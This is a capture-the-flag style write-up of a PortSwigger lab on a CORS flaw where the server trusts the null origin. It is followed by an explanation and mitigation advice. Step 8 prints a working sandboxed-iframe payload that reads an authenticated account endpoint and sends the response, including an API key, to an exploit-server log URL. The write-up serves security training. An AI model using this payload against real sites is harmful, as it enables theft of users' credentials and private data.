# PortSwigger Lab Writeup

## Lab: CORS Vulnerability with Trusted `null` Origin – Apprentice

---

## Lab Overview

This lab demonstrates a Cross-Origin Resource Sharing (CORS) vulnerability caused by the application trusting the `null` origin.

The server accepts requests with the `Origin: null` header and allows credentials to be included. An attacker can exploit this behavior using a sandboxed iframe, which generates requests with a `null` origin, allowing access to sensitive information such as the administrator's API key.

The objective is to retrieve the administrator's API key using a malicious webpage.

---

## Objective

- Identify an insecure CORS configuration
- Confirm that the application trusts the `null` origin
- Exploit the vulnerability to retrieve the administrator's API key

---

## Tools Used

- Burp Suite
- Web Browser
- Exploit Server

---

## Exploitation Steps

1. Log in using the provided credentials:

```
Username: wiener
Password: peter
```

2. Navigate to the **My Account** page.

3. In Burp Suite, observe the request made to:

```
GET /accountDetails
```

4. Send the request to Burp Repeater.

5. Add the following request header:

```
Origin: null
```

6. Send the request.

7. Observe the response headers:

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

This confirms that the application trusts the `null` origin.

8. On the Exploit Server, create the following payload (replace `YOUR-LAB-ID` and `YOUR-EXPLOIT-SERVER-ID` with your values):

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();

req.onload = function() {
    location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' +
    encodeURIComponent(this.responseText);
};

req.open('GET','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
</script>
"></iframe>
```

9. Store the exploit.

10. Click **View Exploit** to verify that your own API key is captured.

11. Deliver the exploit to the victim.

12. Open the **Access Log**, retrieve the administrator's API key, and submit it to solve the lab.

---

## Screenshots

### 1. Request to `/accountDetails`
![Request](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_2-2.png)

### 2. `Origin: null` Reflected
![Null Origin](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_2-3.png)

### 3. Exploit Server Payload
![Exploit](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_2-4.png)

### 4. Administrator API Key Captured
![Result](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_2-5.png)
![Result](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_2-6.png)
![Result](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/cors_lab_2-8.png)


---

## Result

- The application trusted requests originating from the `null` origin.
- The browser included the victim's session cookies.
- The malicious JavaScript successfully read the authenticated response.
- The administrator's API key was captured.

---

## Vulnerability Explanation

This vulnerability occurs because the application incorrectly trusts the `null` origin.

### 1. Trusted `null` Origin

Instead of validating trusted domains, the server accepts requests with:

```
Origin: null
```

The `null` origin can be generated from sandboxed iframes, local files, or other special browser contexts.

### 2. Credentials Are Allowed

The response includes:

```
Access-Control-Allow-Credentials: true
```

This causes the browser to include the victim's authenticated session cookies.

### 3. Sensitive Data Exposure

Since the browser trusts the response, JavaScript running inside the sandboxed iframe can access sensitive account information.

---

## Why the Attack Works

| Component | Effect |
|----------|--------|
| `Origin: null` | Accepted by the server |
| Sandboxed iframe | Generates a `null` origin |
| `Access-Control-Allow-Credentials: true` | Sends session cookies |
| `XMLHttpRequest` | Reads authenticated response |
| Exploit Server | Captures stolen API key |

---

## Mitigation Techniques

### 1. Never Trust the `null` Origin

Reject requests containing:

```
Origin: null
```

unless there is a specific and secure business requirement.

---

### 2. Maintain a Strict Origin Allowlist

Only allow explicitly trusted domains.

Example:

```
Access-Control-Allow-Origin: https://trusted-example.com
```

Avoid dynamically reflecting the `Origin` header.

---

### 3. Restrict Credential Sharing

Only enable:

```
Access-Control-Allow-Credentials: true
```

for trusted origins.

---

### 4. Protect Sensitive APIs

Avoid exposing sensitive endpoints such as profile information and API keys through cross-origin requests.

---

### 5. Perform Server-Side Authorization

Always verify that authenticated users are authorized to access requested resources, regardless of the request origin.

---

## Key Takeaways

- The `null` origin should never be trusted by default.
- Sandboxed iframes can generate requests with a `null` origin.
- Allowing credentials together with a trusted `null` origin can expose sensitive user data.
- Always use a strict allowlist for trusted origins.

---

## Lab Status

Solved Successfully
